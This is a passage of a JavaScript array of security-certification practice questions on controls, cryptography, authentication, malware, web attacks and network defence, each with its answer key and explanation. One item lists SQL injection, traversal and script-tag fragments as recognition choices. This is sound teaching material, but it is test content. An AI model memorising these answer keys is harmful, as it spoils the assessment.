  { id: 'D1-Q004', domain: 1, question: 'An organization implements additional logging when they cannot immediately patch a critical vulnerability. This is an example of a:', options: ['Preventive control', 'Directive control', 'Compensating control', 'Corrective control'], correct: 2, explanation: 'Compensating controls are alternatives used when primary controls are not feasible - additional logging compensates for the unpatched vulnerability.' },
  { id: 'D1-Q005', domain: 1, question: 'Which CIA Triad element is PRIMARILY protected by encryption?', options: ['Confidentiality', 'Integrity', 'Availability', 'Non-repudiation'], correct: 0, explanation: 'Encryption primarily protects confidentiality by preventing unauthorized disclosure of data.' },
  { id: 'D1-Q006', domain: 1, question: 'Hash functions primarily protect which CIA element?', options: ['Confidentiality', 'Integrity', 'Availability', 'Authentication'], correct: 1, explanation: 'Hash functions protect integrity by creating fingerprints that detect any modification to data.' },
  { id: 'D1-Q007', domain: 1, question: 'A user enters a password (something they know) and a fingerprint (something they are). This is:', options: ['Single-factor authentication', 'Two-factor authentication', 'Three-factor authentication', 'Multi-step authentication'], correct: 1, explanation: 'This is two-factor authentication (2FA) - using factors from two different categories: knowledge and inherence.' },
  { id: 'D1-Q008', domain: 1, question: 'Two passwords and a PIN would be considered:', options: ['Three-factor authentication', 'Multi-factor authentication', 'Single-factor authentication', 'Strong authentication'], correct: 2, explanation: 'All three are "something you know" - the same factor category. True MFA requires factors from DIFFERENT categories.' },
  { id: 'D1-Q009', domain: 1, question: 'Which biometric error type is a SECURITY concern?', options: ['False Rejection Rate (FRR)', 'False Acceptance Rate (FAR)', 'Crossover Error Rate (CER)', 'Equal Error Rate (EER)'], correct: 1, explanation: 'FAR (False Acceptance) is a security concern - it means unauthorized users are incorrectly accepted.' },
  { id: 'D1-Q010', domain: 1, question: 'In Zero Trust architecture, which factor grants implicit trust?', options: ['Being on the corporate network', 'Using a company device', 'Previous authentication', 'None of the above'], correct: 3, explanation: 'Zero Trust grants NO implicit trust. Every access must be verified regardless of network location, device, or history.' },
  { id: 'D1-Q011', domain: 1, question: 'Which encryption type uses the same key for encryption and decryption?', options: ['Asymmetric', 'Public key', 'Symmetric', 'Digital signature'], correct: 2, explanation: 'Symmetric encryption uses the same key for both encryption and decryption. AES is the current standard.' },
  { id: 'D1-Q012', domain: 1, question: 'To send an encrypted message to Alice, you should encrypt with:', options: ["Your private key", "Your public key", "Alice's private key", "Alice's public key"], correct: 3, explanation: "Encrypt with the recipient's PUBLIC key. Only Alice's private key can decrypt it." },
  { id: 'D1-Q013', domain: 1, question: 'Digital signatures provide all of the following EXCEPT:', options: ['Integrity', 'Authentication', 'Non-repudiation', 'Confidentiality'], correct: 3, explanation: 'Digital signatures provide integrity, authentication, and non-repudiation - NOT confidentiality. Encryption provides confidentiality.' },
  { id: 'D1-Q014', domain: 1, question: 'Which hash algorithm is considered DEPRECATED and should not be used for security purposes?', options: ['SHA-256', 'SHA-3', 'MD5', 'SHA-512'], correct: 2, explanation: 'MD5 is deprecated due to collision vulnerabilities. SHA-256 and SHA-3 are current standards.' },
  { id: 'D1-Q015', domain: 1, question: 'For password storage, which algorithm is MOST appropriate?', options: ['SHA-256', 'AES-256', 'bcrypt', 'MD5'], correct: 2, explanation: 'bcrypt (or Argon2, PBKDF2) is designed for passwords - intentionally slow to prevent brute force. SHA-256 is too fast.' },
  { id: 'D1-Q016', domain: 1, question: 'A mantrap is designed to prevent:', options: ['DDoS attacks', 'Tailgating', 'Shoulder surfing', 'Dumpster diving'], correct: 1, explanation: 'Mantraps (airlocks) prevent tailgating by allowing only one person through at a time.' },
  { id: 'D1-Q017', domain: 1, question: 'Which fire suppression agent is safe for use in data centers with electronics?', options: ['Water sprinklers', 'FM-200', 'Wet pipe systems', 'Foam'], correct: 1, explanation: 'FM-200 is a clean agent that suppresses fire without damaging electronics. Water damages equipment.' },
  { id: 'D1-Q018', domain: 1, question: 'A decoy system designed to attract and detect attackers is called a:', options: ['Honeytoken', 'Honeypot', 'DNS sinkhole', 'Sandbox'], correct: 1, explanation: 'A honeypot is a decoy system that attracts attackers. Any interaction is suspicious since legitimate users have no reason to access it.' },
  { id: 'D1-Q019', domain: 1, question: 'The Change Advisory Board (CAB) is responsible for:', options: ['Implementing emergency patches', 'Reviewing and approving changes', 'Writing security policies', 'Monitoring system logs'], correct: 1, explanation: 'The CAB reviews and approves changes before implementation to assess risk and impact.' },
  { id: 'D1-Q020', domain: 1, question: 'During an emergency change, what documentation is required?', options: ['None - emergencies are exempt', 'Post-implementation documentation only', 'Pre-approval and post-implementation review', 'Only verbal approval'], correct: 2, explanation: 'Emergency changes still require documentation and post-implementation review, even if pre-approval is expedited.' },
  // Continue with more D1 questions...
  { id: 'D1-Q021', domain: 1, question: 'Defense in depth relies on which principle?', options: ['Single point of protection', 'Multiple overlapping security layers', 'Perimeter-only security', 'Trust but verify'], correct: 1, explanation: 'Defense in depth uses multiple overlapping security layers so if one fails, others still provide protection.' },
  { id: 'D1-Q022', domain: 1, question: 'RADIUS and TACACS+ are protocols used for:', options: ['Encryption', 'AAA (Authentication, Authorization, Accounting)', 'File transfer', 'Email security'], correct: 1, explanation: 'RADIUS and TACACS+ are AAA protocols. TACACS+ encrypts the entire packet and uses TCP; RADIUS uses UDP and only encrypts passwords.' },
  { id: 'D1-Q023', domain: 1, question: 'Which protocol encrypts the entire authentication packet?', options: ['RADIUS', 'TACACS+', 'Both equally', 'Neither'], correct: 1, explanation: 'TACACS+ encrypts the entire packet. RADIUS only encrypts the password field.' },
  { id: 'D1-Q024', domain: 1, question: 'RTO (Recovery Time Objective) defines:', options: ['Maximum acceptable data loss', 'Maximum acceptable downtime', 'Backup frequency', 'Incident response time'], correct: 1, explanation: 'RTO is the maximum acceptable downtime. RPO is the maximum acceptable data loss.' },
  { id: 'D1-Q025', domain: 1, question: 'A hot site provides:', options: ['Empty space for equipment', 'Equipment ready within days', 'Immediate failover capability', 'Backup tapes only'], correct: 2, explanation: 'A hot site is fully equipped and ready for immediate failover. Warm sites need hours; cold sites need days.' },
  { id: 'D1-Q026', domain: 1, question: 'The AAA framework sequence is:', options: ['Authorization → Authentication → Accounting', 'Authentication → Accounting → Authorization', 'Authentication → Authorization → Accounting', 'Accounting → Authentication → Authorization'], correct: 2, explanation: 'AAA sequence: First verify identity (Authentication), then determine permissions (Authorization), then log activity (Accounting).' },
  { id: 'D1-Q027', domain: 1, question: 'Which BEST describes a policy?', options: ['Step-by-step instructions', 'High-level mandatory statement from management', 'Optional recommendations', 'Technical configurations'], correct: 1, explanation: 'A policy is a high-level mandatory statement establishing management intent. Procedures provide step-by-step instructions.' },
  { id: 'D1-Q028', domain: 1, question: 'Microsegmentation primarily helps prevent:', options: ['External attacks', 'Lateral movement', 'Phishing', 'DDoS attacks'], correct: 1, explanation: 'Microsegmentation creates security boundaries around individual workloads, limiting lateral movement after a breach.' },
  { id: 'D1-Q029', domain: 1, question: 'FIDO2/WebAuthn provides protection against:', options: ['DDoS attacks', 'Phishing attacks', 'SQL injection', 'Buffer overflow'], correct: 1, explanation: 'FIDO2 is phishing-resistant because credentials are bound to specific websites and cannot be reused on fake sites.' },
  { id: 'D1-Q030', domain: 1, question: 'A system that denies access when it fails is described as:', options: ['Fail open', 'Fail secure', 'Fail safe', 'Fail closed'], correct: 1, explanation: 'Fail secure (also called fail closed) denies access when the system fails. Fail open allows access during failure.' },
  { id: 'D1-Q031', domain: 1, question: 'Separation of duties is designed to prevent:', options: ['External attacks', 'Fraud by single individuals', 'DDoS attacks', 'SQL injection'], correct: 1, explanation: 'Separation of duties ensures no single person controls an entire critical process, preventing fraud.' },
  { id: 'D1-Q032', domain: 1, question: 'Which is NOT an authentication factor?', options: ['Something you know', 'Something you have', 'Something you are', 'Something you want'], correct: 3, explanation: 'The five factors are: Know, Have, Are, Where (location), Do (behavior). "Want" is not an authentication factor.' },
  { id: 'D1-Q033', domain: 1, question: 'ECC (Elliptic Curve Cryptography) compared to RSA provides:', options: ['Weaker security', 'Same security with smaller keys', 'Only symmetric encryption', 'No digital signatures'], correct: 1, explanation: 'ECC provides equivalent security with much smaller keys (256-bit ECC ≈ 3072-bit RSA).' },
  { id: 'D1-Q034', domain: 1, question: 'Which describes the role of a Certificate Authority (CA)?', options: ['Encrypts all network traffic', 'Issues and manages digital certificates', 'Stores private keys', 'Performs penetration testing'], correct: 1, explanation: 'A CA issues digital certificates, binding public keys to identities through its signature.' },
  { id: 'D1-Q035', domain: 1, question: 'A DNS sinkhole is used to:', options: ['Speed up DNS queries', 'Redirect malicious domain queries', 'Encrypt DNS traffic', 'Cache DNS responses'], correct: 1, explanation: 'A DNS sinkhole redirects queries for malicious domains to a controlled server, disrupting malware communication.' },
  { id: 'D1-Q036', domain: 1, question: 'Bollards are physical controls designed to protect against:', options: ['Tailgating', 'Vehicle attacks', 'Shoulder surfing', 'Fire'], correct: 1, explanation: 'Bollards are posts that prevent vehicle attacks by blocking cars from crashing into buildings.' },
  { id: 'D1-Q037', domain: 1, question: 'TOTP authentication codes change based on:', options: ['A counter', 'Current time', 'Random generation', 'User input'], correct: 1, explanation: 'TOTP (Time-based One-Time Password) generates codes based on current time, typically changing every 30 seconds.' },
  { id: 'D1-Q038', domain: 1, question: 'Positive pressure in a data center is used to:', options: ['Cool equipment faster', 'Keep contaminants out', 'Reduce fire risk', 'Save energy'], correct: 1, explanation: 'Positive pressure keeps contaminants out by ensuring air flows outward when doors open.' },
  { id: 'D1-Q039', domain: 1, question: 'The CER/EER of a biometric system represents:', options: ['The maximum error rate', 'Where FAR equals FRR', 'The minimum security level', 'Customer satisfaction'], correct: 1, explanation: 'CER/EER (Crossover/Equal Error Rate) is where FAR equals FRR. Lower CER means better biometric performance.' },
  { id: 'D1-Q040', domain: 1, question: 'Hybrid encryption combines:', options: ['Two symmetric algorithms', 'Symmetric and asymmetric encryption', 'Two asymmetric algorithms', 'Hashing and encryption'], correct: 1, explanation: 'Hybrid encryption uses asymmetric encryption to exchange a symmetric key, then symmetric for bulk data - best of both worlds.' },
  { id: 'D1-Q041', domain: 1, question: 'A honeytoken is:', options: ['A decoy server', 'Fake credentials that alert when used', 'A type of encryption', 'A backup system'], correct: 1, explanation: 'A honeytoken is fake credentials or data that triggers an alert when used, indicating potential compromise.' },
  { id: 'D1-Q042', domain: 1, question: 'Which control type is OPTIONAL?', options: ['Policy', 'Standard', 'Procedure', 'Guideline'], correct: 3, explanation: 'Guidelines are optional recommendations. Policies, standards, and procedures are mandatory.' },
  { id: 'D1-Q043', domain: 1, question: 'AES is which type of encryption algorithm?', options: ['Asymmetric', 'Symmetric', 'Hashing', 'Digital signature'], correct: 1, explanation: 'AES (Advanced Encryption Standard) is a symmetric encryption algorithm using the same key for encryption and decryption.' },
  { id: 'D1-Q044', domain: 1, question: 'Non-repudiation is BEST provided by:', options: ['Encryption', 'Hashing', 'Digital signatures', 'Access controls'], correct: 2, explanation: 'Digital signatures provide non-repudiation - cryptographic proof that a specific person signed the data.' },
  { id: 'D1-Q045', domain: 1, question: 'Salting passwords protects against:', options: ['Brute force attacks', 'Rainbow table attacks', 'Phishing attacks', 'Man-in-the-middle attacks'], correct: 1, explanation: 'Salting adds unique random data to each password before hashing, defeating precomputed rainbow tables.' },
  { id: 'D1-Q046', domain: 1, question: 'Which describes operational controls?', options: ['Technology-based controls', 'Management policies', 'Day-to-day procedures performed by people', 'Tangible protective mechanisms'], correct: 2, explanation: 'Operational controls are day-to-day procedures performed by people, like log reviews and backup verification.' },
  { id: 'D1-Q047', domain: 1, question: 'A deterrent control is designed to:', options: ['Detect attacks', 'Prevent all attacks', 'Discourage security violations', 'Fix security issues'], correct: 2, explanation: 'Deterrent controls discourage violations by making potential consequences clear, like warning signs.' },
  { id: 'D1-Q048', domain: 1, question: 'DES encryption should be:', options: ['Used for sensitive data', 'Never used (deprecated)', 'Used with 256-bit keys', 'Combined with MD5'], correct: 1, explanation: 'DES is deprecated due to its short 56-bit key. Use AES instead.' },
  { id: 'D1-Q049', domain: 1, question: 'Which is NOT part of the Zero Trust model?', options: ['Verify explicitly', 'Least privilege access', 'Assume breach', 'Trust internal networks'], correct: 3, explanation: 'Zero Trust eliminates implicit trust including for internal networks. "Never trust, always verify."' },
  { id: 'D1-Q050', domain: 1, question: 'RPO (Recovery Point Objective) defines:', options: ['Maximum acceptable downtime', 'Maximum acceptable data loss', 'Recovery speed', 'Backup retention period'], correct: 1, explanation: 'RPO is maximum acceptable data loss (time). If RPO is 4 hours, backups must run at least every 4 hours.' },
  
  // Domain 2 Questions (50)
  { id: 'D2-Q001', domain: 2, question: 'Which threat actor has the HIGHEST capability and resources?', options: ['Script kiddies', 'Hacktivists', 'Nation-state actors', 'Insider threats'], correct: 2, explanation: 'Nation-state actors have virtually unlimited resources, sophisticated tools, and often conduct APT campaigns.' },
  { id: 'D2-Q002', domain: 2, question: 'RaaS (Ransomware-as-a-Service) is primarily associated with:', options: ['Nation-states', 'Organized crime', 'Hacktivists', 'Script kiddies'], correct: 1, explanation: 'RaaS is a business model used by organized crime groups, providing ransomware tools to affiliates for profit sharing.' },
  { id: 'D2-Q003', domain: 2, question: 'Double extortion ransomware involves:', options: ['Two encryption keys', 'Encrypting AND threatening to leak data', 'Attacking two organizations', 'Demanding payment twice'], correct: 1, explanation: 'Double extortion encrypts data AND threatens to leak stolen data if ransom is not paid.' },
  { id: 'D2-Q004', domain: 2, question: 'A watering hole attack involves:', options: ['Contaminating water supplies', 'Compromising websites targets frequently visit', 'Social engineering phone calls', 'Email phishing'], correct: 1, explanation: 'Watering hole attacks compromise websites frequently visited by targets, like predators waiting at a watering hole.' },
  { id: 'D2-Q005', domain: 2, question: 'Which attack exploits the TCP three-way handshake?', options: ['DNS amplification', 'SYN flood', 'ARP poisoning', 'SSL stripping'], correct: 1, explanation: 'SYN flood exploits TCP handshake by sending many SYN packets without completing connections, exhausting server resources.' },
  { id: 'D2-Q006', domain: 2, question: 'Spear phishing differs from regular phishing because it is:', options: ['Automated', 'Targeted at specific individuals', 'More common', 'Uses voice calls'], correct: 1, explanation: 'Spear phishing is targeted at specific individuals using personalized information from research.' },
  { id: 'D2-Q007', domain: 2, question: 'Whaling targets:', options: ['Random users', 'IT administrators', 'Senior executives', 'External vendors'], correct: 2, explanation: 'Whaling targets senior executives ("big fish") with highly personalized attacks.' },
  { id: 'D2-Q008', domain: 2, question: 'BEC (Business Email Compromise) typically involves:', options: ['Malware installation', 'Wire fraud through impersonation', 'DDoS attacks', 'SQL injection'], correct: 1, explanation: 'BEC impersonates executives or partners to trick employees into wire transfers or sharing sensitive data.' },
  { id: 'D2-Q009', domain: 2, question: 'Vishing uses which communication channel?', options: ['Email', 'SMS/text', 'Voice/phone calls', 'Social media'], correct: 2, explanation: 'Vishing (voice phishing) uses phone calls for social engineering attacks.' },
  { id: 'D2-Q010', domain: 2, question: 'A virus differs from a worm because a virus:', options: ['Spreads faster', 'Requires a host file and user action', 'Is more dangerous', 'Uses encryption'], correct: 1, explanation: 'Viruses require a host file and user action to spread. Worms self-propagate without user action.' },
  { id: 'D2-Q011', domain: 2, question: 'Which malware type disguises itself as legitimate software?', options: ['Virus', 'Worm', 'Trojan', 'Rootkit'], correct: 2, explanation: 'Trojans disguise themselves as legitimate software to trick users into installation.' },
  { id: 'D2-Q012', domain: 2, question: 'A rootkit primarily:', options: ['Encrypts files', 'Hides malware presence', 'Steals credentials', 'Sends spam'], correct: 1, explanation: 'Rootkits hide malware and attacker activity at various system levels (user, kernel, firmware).' },
  { id: 'D2-Q013', domain: 2, question: 'Fileless malware operates:', options: ['From USB drives only', 'In memory without files on disk', 'Through email only', 'On mobile devices only'], correct: 1, explanation: 'Fileless malware operates in memory, often using legitimate tools like PowerShell, leaving minimal disk traces.' },
  { id: 'D2-Q014', domain: 2, question: 'SQL injection attacks target:', options: ['Network protocols', 'Database queries', 'Email systems', 'File systems'], correct: 1, explanation: 'SQL injection inserts malicious SQL into user input to manipulate database queries.' },
  { id: 'D2-Q015', domain: 2, question: 'The BEST defense against SQL injection is:', options: ['Web Application Firewall', 'Input length limits', 'Parameterized queries', 'Network firewalls'], correct: 2, explanation: 'Parameterized queries (prepared statements) separate data from code, making SQL injection impossible.' },
  { id: 'D2-Q016', domain: 2, question: 'Stored XSS is more dangerous than reflected XSS because:', options: ['It uses encryption', 'Malicious scripts are stored and served to all users', 'It requires authentication', 'It only affects administrators'], correct: 1, explanation: 'Stored XSS saves malicious scripts in the database, affecting all users who view the content.' },
  { id: 'D2-Q017', domain: 2, question: 'CSRF attacks exploit:', options: ['Weak passwords', 'Authenticated user sessions', 'Network protocols', 'Encryption algorithms'], correct: 1, explanation: 'CSRF tricks authenticated users into performing unwanted actions using their existing session.' },
  { id: 'D2-Q018', domain: 2, question: 'Directory traversal attacks use sequences like:', options: ['SELECT *', 'OR 1=1', '../..', '<script>'], correct: 2, explanation: 'Directory traversal uses ../ sequences to access files outside the web root directory.' },
  { id: 'D2-Q019', domain: 2, question: 'DNS amplification attacks rely on:', options: ['Small queries generating large responses', 'Encrypted DNS traffic', 'DNS over HTTPS', 'Internal DNS servers'], correct: 0, explanation: 'DNS amplification sends small queries with spoofed source IPs, causing large responses to flood the victim.' },
  { id: 'D2-Q020', domain: 2, question: 'ARP poisoning enables:', options: ['Denial of service only', 'Man-in-the-middle attacks', 'Password cracking', 'SQL injection'], correct: 1, explanation: 'ARP poisoning redirects traffic through the attacker by sending fake ARP replies, enabling MITM attacks.' },
  { id: 'D2-Q021', domain: 2, question: 'SSL stripping:', options: ['Strengthens encryption', 'Downgrades HTTPS to HTTP', 'Adds SSL certificates', 'Blocks all traffic'], correct: 1, explanation: 'SSL stripping downgrades HTTPS connections to HTTP, allowing the attacker to intercept unencrypted traffic.' },
  { id: 'D2-Q022', domain: 2, question: 'CVSS scores in the Critical range are:', options: ['0.0-3.9', '4.0-6.9', '7.0-8.9', '9.0-10.0'], correct: 3, explanation: 'CVSS Critical: 9.0-10.0, High: 7.0-8.9, Medium: 4.0-6.9, Low: 0.1-3.9.' },
  { id: 'D2-Q023', domain: 2, question: 'Which scan type provides the MOST accurate results?', options: ['Non-credentialed scan', 'Port scan', 'Credentialed scan', 'Ping scan'], correct: 2, explanation: 'Credentialed (authenticated) scans access more system information, providing more accurate vulnerability data.' },
  { id: 'D2-Q024', domain: 2, question: 'Virtual patching is implemented through:', options: ['Operating system updates', 'WAF/IPS rules', 'Hardware replacement', 'User training'], correct: 1, explanation: 'Virtual patching uses WAF or IPS rules to block exploitation without modifying the vulnerable application.' },
  { id: 'D2-Q025', domain: 2, question: 'IOC stands for:', options: ['Input/Output Control', 'Indicator of Compromise', 'Internet Operations Center', 'Internal Operations Command'], correct: 1, explanation: 'IOC (Indicator of Compromise) is evidence that a system has been breached, like malicious file hashes or IPs.' },
  { id: 'D2-Q026', domain: 2, question: 'IOAs differ from IOCs because IOAs indicate:', options: ['Past compromises', 'Current ongoing attacks', 'Future vulnerabilities', 'Compliance issues'], correct: 1, explanation: 'IOAs (Indicators of Attack) show attacks in progress through behavioral patterns. IOCs show past compromise.' },
  { id: 'D2-Q027', domain: 2, question: 'The Cyber Kill Chain stage after "Delivery" is:', options: ['Reconnaissance', 'Weaponization', 'Exploitation', 'Installation'], correct: 2, explanation: 'Kill Chain: Recon → Weaponization → Delivery → Exploitation → Installation → C2 → Actions.' },
  { id: 'D2-Q028', domain: 2, question: 'MITRE ATT&CK organizes attacks by:', options: ['CVSS scores', 'Tactics and techniques', 'Vulnerability age', 'Attacker nationality'], correct: 1, explanation: 'MITRE ATT&CK maps adversary tactics (goals) and techniques (methods) used in attacks.' },
  { id: 'D2-Q029', domain: 2, question: 'Penetration testing differs from vulnerability assessment because it:', options: ['Is automated', 'Attempts actual exploitation', 'Is less thorough', 'Uses no tools'], correct: 1, explanation: 'Penetration testing attempts actual exploitation to prove vulnerabilities are exploitable.' },
  { id: 'D2-Q030', domain: 2, question: 'Red team exercises simulate:', options: ['Defenders', 'Attackers', 'Auditors', 'Managers'], correct: 1, explanation: 'Red teams simulate attackers. Blue teams are defenders. Purple teams facilitate collaboration.' },
  { id: 'D2-Q031', domain: 2, question: 'Disabling SMBv1 would have prevented which attack?', options: ['Heartbleed', 'WannaCry', 'SQL Injection', 'Phishing'], correct: 1, explanation: 'WannaCry exploited EternalBlue vulnerability in SMBv1. Disabling SMBv1 prevents this attack.' },
  { id: 'D2-Q032', domain: 2, question: 'CIS Benchmarks provide:', options: ['Threat intelligence', 'Security hardening guidelines', 'Incident response procedures', 'Compliance regulations'], correct: 1, explanation: 'CIS Benchmarks provide industry-standard security hardening guidelines for various systems.' },
  { id: 'D2-Q033', domain: 2, question: 'Beaconing is an IOC indicating:', options: ['Normal network traffic', 'Command and control communication', 'Backup processes', 'User authentication'], correct: 1, explanation: 'Beaconing is regular, periodic communication to command and control servers, indicating malware.' },
  { id: 'D2-Q034', domain: 2, question: 'STIX and TAXII are used for:', options: ['Encryption', 'Threat intelligence sharing', 'Network monitoring', 'Access control'], correct: 1, explanation: 'STIX is a format for threat intelligence; TAXII is the transport protocol for sharing it.' },
  { id: 'D2-Q035', domain: 2, question: 'An evil twin attack involves:', options: ['Cloning a hard drive', 'Creating a fake wireless access point', 'Duplicating user accounts', 'Copying encryption keys'], correct: 1, explanation: 'Evil twin creates a fake AP with the same SSID as a legitimate network for man-in-the-middle attacks.' },
  { id: 'D2-Q036', domain: 2, question: 'Supply chain attacks compromise:', options: ['Physical supply routes', 'Trusted vendors to reach their customers', 'Supply and demand economics', 'Shipping containers'], correct: 1, explanation: 'Supply chain attacks compromise trusted vendors (like SolarWinds) to reach downstream victims.' },
  { id: 'D2-Q037', domain: 2, question: 'SBOM stands for:', options: ['Security Baseline Operations Manual', 'Software Bill of Materials', 'System Backup Online Manager', 'Secure Business Object Model'], correct: 1, explanation: 'SBOM (Software Bill of Materials) lists all components in software, helping track supply chain risks.' },
  { id: 'D2-Q038', domain: 2, question: 'Insider threat types include all EXCEPT:', options: ['Malicious', 'Negligent', 'Compromised', 'External'], correct: 3, explanation: 'Insider threat types: Malicious (intentional harm), Negligent (accidents), Compromised (credential theft). External threats are not insiders.' },
  { id: 'D2-Q039', domain: 2, question: 'RAT stands for:', options: ['Random Access Terminal', 'Remote Access Trojan', 'Redundant Array Technology', 'Risk Assessment Tool'], correct: 1, explanation: 'RAT (Remote Access Trojan) gives attackers remote control over infected systems.' },
  { id: 'D2-Q040', domain: 2, question: 'Logic bombs trigger based on:', options: ['User input', 'Specific conditions (time, event)', 'Random intervals', 'Network traffic'], correct: 1, explanation: 'Logic bombs activate when specific conditions are met, like a date or an employee termination event.' },
  { id: 'D2-Q041', domain: 2, question: 'Authority and urgency are principles commonly exploited in:', options: ['DDoS attacks', 'Social engineering', 'Buffer overflows', 'SQL injection'], correct: 1, explanation: 'Social engineering exploits psychological principles like authority (I am IT) and urgency (act now).' },
  { id: 'D2-Q042', domain: 2, question: 'DMARC, DKIM, and SPF protect against:', options: ['DDoS attacks', 'Email spoofing', 'SQL injection', 'Ransomware'], correct: 1, explanation: 'These email authentication protocols help prevent email spoofing and phishing by verifying sender identity.' },
  { id: 'D2-Q043', domain: 2, question: 'Smishing uses which attack vector?', options: ['Email', 'SMS/text messages', 'Voice calls', 'USB drives'], correct: 1, explanation: 'Smishing (SMS phishing) uses text messages to deliver phishing attacks.' },
  { id: 'D2-Q044', domain: 2, question: 'Buffer overflow attacks can lead to:', options: ['Only crashes', 'Arbitrary code execution', 'Only data corruption', 'Only denial of service'], correct: 1, explanation: 'Buffer overflows can overwrite memory, potentially allowing arbitrary code execution.' },
  { id: 'D2-Q045', domain: 2, question: 'Pretexting involves:', options: ['Creating a false scenario to manipulate targets', 'Sending phishing emails', 'Installing malware', 'Cracking passwords'], correct: 0, explanation: 'Pretexting creates a false scenario (pretext) to manipulate targets into revealing information.' },
  { id: 'D2-Q046', domain: 2, question: 'Bluesnarfing is:', options: ['Sending unsolicited messages via Bluetooth', 'Stealing data via Bluetooth', 'Taking control of Bluetooth devices', 'Blocking Bluetooth signals'], correct: 1, explanation: 'Bluesnarfing steals data. Bluejacking sends messages. Bluebugging takes device control.' },
  { id: 'D2-Q047', domain: 2, question: 'A keylogger is a type of:', options: ['Ransomware', 'Spyware', 'Worm', 'Rootkit'], correct: 1, explanation: 'Keyloggers are spyware that record keystrokes to capture passwords and other sensitive input.' },
  { id: 'D2-Q048', domain: 2, question: 'Typosquatting exploits:', options: ['Software vulnerabilities', 'Misspelled domain names', 'Network protocols', 'Authentication systems'], correct: 1, explanation: 'Typosquatting registers domains similar to legitimate ones (like googIe.com) to catch typos.' },
  { id: 'D2-Q049', domain: 2, question: 'Application whitelisting:', options: ['Blocks known malware', 'Only allows approved applications', 'Filters web content', 'Encrypts applications'], correct: 1, explanation: 'Whitelisting only allows approved applications to run, blocking everything else including unknown malware.' },
  { id: 'D2-Q050', domain: 2, question: 'Content Security Policy (CSP) helps prevent:', options: ['SQL injection', 'XSS attacks', 'Buffer overflow', 'ARP poisoning'], correct: 1, explanation: 'CSP helps prevent XSS by restricting what scripts can execute on web pages.' },
  
  // Domain 3 Questions (50)
  { id: 'D3-Q001', domain: 3, question: 'Which architecture principle assumes breach has occurred?', options: ['Defense in depth', 'Zero Trust', 'Least privilege', 'Separation of duties'], correct: 1, explanation: 'Zero Trust assumes breach and limits blast radius. "Never trust, always verify."' },
  { id: 'D3-Q002', domain: 3, question: 'Fail secure means:', options: ['Systems allow access when failing', 'Systems deny access when failing', 'Systems reboot automatically', 'Systems alert administrators'], correct: 1, explanation: 'Fail secure denies access when the system fails. Fail open would allow access.' },
  { id: 'D3-Q003', domain: 3, question: 'Type 1 hypervisors run:', options: ['On top of an operating system', 'Directly on hardware (bare metal)', 'Only in the cloud', 'On mobile devices only'], correct: 1, explanation: 'Type 1 (bare metal) hypervisors run directly on hardware. Type 2 run on top of an OS.' },
  { id: 'D3-Q004', domain: 3, question: 'VM escape is:', options: ['Moving a VM between hosts', 'Breaking out of a VM to the hypervisor', 'Shutting down a VM', 'Cloning a VM'], correct: 1, explanation: 'VM escape is breaking out of a virtual machine to access the hypervisor or other VMs - a critical threat.' },
  { id: 'D3-Q005', domain: 3, question: 'EDR provides:', options: ['Email filtering', 'Behavioral detection and response on endpoints', 'DNS security', 'Network segmentation'], correct: 1, explanation: 'EDR (Endpoint Detection and Response) provides behavioral detection, forensics, and automated response.' },
  { id: 'D3-Q006', domain: 3, question: 'SCADA/ICS systems typically require:', options: ['Frequent patching', 'Network isolation', 'Public internet access', 'Consumer antivirus'], correct: 1, explanation: 'SCADA/ICS often cannot be patched and require network isolation to protect them.' },
  { id: 'D3-Q007', domain: 3, question: 'NGFW differs from traditional firewalls by adding:', options: ['Packet filtering only', 'Application awareness and IPS', 'Only stateful inspection', 'Only logging'], correct: 1, explanation: 'NGFW adds application awareness, IPS, SSL inspection, and user identity integration.' },
  { id: 'D3-Q008', domain: 3, question: 'WAF protects against:', options: ['Network layer attacks', 'Application layer attacks like SQLi and XSS', 'Physical intrusions', 'Power failures'], correct: 1, explanation: 'WAF (Web Application Firewall) operates at Layer 7, protecting web applications from attacks.' },
  { id: 'D3-Q009', domain: 3, question: 'IPS differs from IDS because IPS:', options: ['Only detects attacks', 'Detects AND blocks attacks inline', 'Is less accurate', 'Uses no signatures'], correct: 1, explanation: 'IPS detects and blocks attacks inline. IDS only detects and alerts.' },
  { id: 'D3-Q010', domain: 3, question: 'TLS 1.3 is preferred over TLS 1.2 because:', options: ['It is older and tested', 'It has improved security and performance', 'It is simpler', 'It uses MD5'], correct: 1, explanation: 'TLS 1.3 removes weak ciphers, reduces handshake latency, and requires forward secrecy.' },
  { id: 'D3-Q011', domain: 3, question: '802.1X provides:', options: ['Wireless encryption', 'Port-based network access control', 'VPN connectivity', 'DNS security'], correct: 1, explanation: '802.1X provides port-based NAC using supplicant, authenticator, and RADIUS server.' },
  { id: 'D3-Q012', domain: 3, question: 'ZTNA differs from VPN because ZTNA provides:', options: ['Full network access', 'Application-specific access only', 'Faster speeds', 'No encryption'], correct: 1, explanation: 'ZTNA provides access to specific applications only, unlike VPN which gives network-level access.' },
  { id: 'D3-Q013', domain: 3, question: 'WPA3 SAE protects against:', options: ['DDoS attacks', 'Offline dictionary attacks', 'SQL injection', 'Phishing'], correct: 1, explanation: 'WPA3 SAE (Simultaneous Authentication of Equals) resists offline dictionary attacks even with weak passwords.' },
  { id: 'D3-Q014', domain: 3, question: 'Which wireless protocol should NEVER be used?', options: ['WPA3', 'WPA2-AES', 'WEP', 'WPA2-Enterprise'], correct: 2, explanation: 'WEP is completely broken and can be cracked in minutes. Never use WEP.' },
  { id: 'D3-Q015', domain: 3, question: 'WPA2-Enterprise uses:', options: ['Pre-shared keys only', '802.1X with RADIUS', 'No encryption', 'WEP underneath'], correct: 1, explanation: 'WPA2-Enterprise uses 802.1X authentication with RADIUS for individual user credentials.' },
  { id: 'D3-Q016', domain: 3, question: 'An evil twin attack creates:', options: ['Duplicate user accounts', 'A fake AP with same SSID', 'Copied encryption keys', 'Cloned hard drives'], correct: 1, explanation: 'Evil twin creates a fake access point with the same SSID to intercept traffic.' },
  { id: 'D3-Q017', domain: 3, question: 'Bluebugging allows:', options: ['Sending messages', 'Stealing data', 'Full device control', 'Blocking signals'], correct: 2, explanation: 'Bluebugging gives full control of a Bluetooth device. Bluejacking sends messages; Bluesnarfing steals data.' },
  { id: 'D3-Q018', domain: 3, question: 'In IaaS, who patches the operating system?', options: ['Cloud provider', 'Customer', 'Third party', 'No one'], correct: 1, explanation: 'In IaaS, customers manage OS and above, including patching. Provider handles infrastructure.' },
